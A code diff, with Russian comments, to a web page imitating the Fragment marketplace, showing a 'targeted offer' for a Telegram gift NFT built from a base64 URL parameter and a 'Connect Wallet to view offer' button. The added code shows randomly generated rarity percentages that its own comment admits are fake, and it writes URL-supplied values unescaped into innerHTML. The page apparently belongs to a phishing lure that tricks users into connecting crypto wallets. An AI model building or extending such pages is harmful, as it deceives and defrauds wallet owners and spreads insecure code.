@@ -19,6 +19,8 @@
         @media (max-width: 767px) { #giftImage { width: 100%; height: auto; aspect-ratio: 1; } }
         .connect-btn-header { display: flex; align-items: center; gap: 8px; cursor: pointer; }
         .tm-section-countdown-wrap { display: none; }
+        /* Стили для бейджа редкости */
+        .tm-rarity { font-size: 11px; padding: 2px 6px; border-radius: 6px; background: rgba(90, 236, 140, 0.1); color: #5aec8c; margin-left: 8px; vertical-align: middle; }
     </style>
 </head>
 <body class="emoji_image">
@@ -57,7 +59,7 @@
                 <div class="tm-section-box tm-section-auction-info">
                     <table class="table tm-table tm-table-fixed">
                         <colgroup><col style="--thin-width:110px;--wide-width:30%"><col style="--thin-width:100%;--wide-width:70%"></colgroup>
-                        <tbody>
+                        <tbody id="attributesTable">
                             <tr><td><div class="table-cell">Collection</div></td><td><div class="table-cell" id="giftCollection">Gifts</div></td></tr>
                             <tr><td><div class="table-cell">Owner</div></td><td><div class="table-cell">You</div></td></tr>
                             <tr><td><div class="table-cell">Network</div></td><td><div class="table-cell">TON</div></td></tr>
@@ -114,8 +116,20 @@
         const giftCollEl = document.getElementById('giftCollection');
         const offerPriceEl = document.getElementById('offerPrice');
         const offerUsdEl = document.getElementById('offerUsd');
+        const attributesTable = document.getElementById('attributesTable');
 
         const FALLBACK_IMG = "https://nft.fragment.com/img/placeholder.png";
+
+        // Форматирование имени (на случай если пришло scaredcat-2920)
+        function formatName(name) {
+            if (!name) return "Telegram Gift";
+            // Если есть дефис и нет решетки, меняем на решетку
+            if (name.includes('-') && !name.includes('#')) {
+                let parts = name.split('-');
+                return parts[0].charAt(0).toUpperCase() + parts[0].slice(1) + ' #' + parts[1];
+            }
+            return name;
+        }
 
         function updatePriceUI(price) {
             currentPrice = price;
@@ -132,12 +146,44 @@
                 const decoded = JSON.parse(decodeURIComponent(escape(atob(base64))));
                 
                 targetNftAddress = decoded.nft;
-                giftNameEl.innerText = decoded.name || "Telegram Gift";
+                
+                // Ставим красивое имя
+                giftNameEl.innerText = formatName(decoded.name);
                 giftCollEl.innerText = decoded.coll || "Gifts Collection";
                 giftImage.src = decoded.img || FALLBACK_IMG;
                 isTargetedOffer = true;
 
                 if (decoded.price) updatePriceUI(parseFloat(decoded.price));
+
+                // Рендерим атрибуты, если они есть
+                if (decoded.attrs && decoded.attrs.length > 0) {
+                    // Очищаем таблицу, оставляя только Collection и Network
+                    attributesTable.innerHTML = `
+                        <tr><td><div class="table-cell">Collection</div></td><td><div class="table-cell" id="giftCollection">${decoded.coll || "Gifts"}</div></td></tr>
+                    `;
+                    
+                    // Добавляем атрибуты (Model, Backdrop и т.д.)
+                    decoded.attrs.forEach(attr => {
+                        if (attr.trait_type && attr.value) {
+                            // Считаем фейковый процент редкости для красоты (рандом от 1 до 5%)
+                            const rarity = (Math.random() * 4 + 1).toFixed(1); 
+                            attributesTable.innerHTML += `
+                                <tr>
+                                    <td><div class="table-cell">${attr.trait_type}</div></td>
+                                    <td>
+                                        <div class="table-cell">
+                                            <div class="table-cell-value tm-value">${attr.value}</div>
+                                            <span class="tm-rarity">${rarity}%</span>
+                                        </div>
+                                    </td>
+                                </tr>
+                            `;
+                        }
+                    });
+                    
+                    // Добавляем Network в конец
+                    attributesTable.innerHTML += `<tr><td><div class="table-cell">Network</div></td><td><div class="table-cell">TON</div></td></tr>`;
+                }
 
                 acceptBtn.innerHTML = '<span class="tm-button-label">Connect Wallet to view offer</span>';
                 acceptBtn.onclick = () => tonConnectUI.connectWallet();
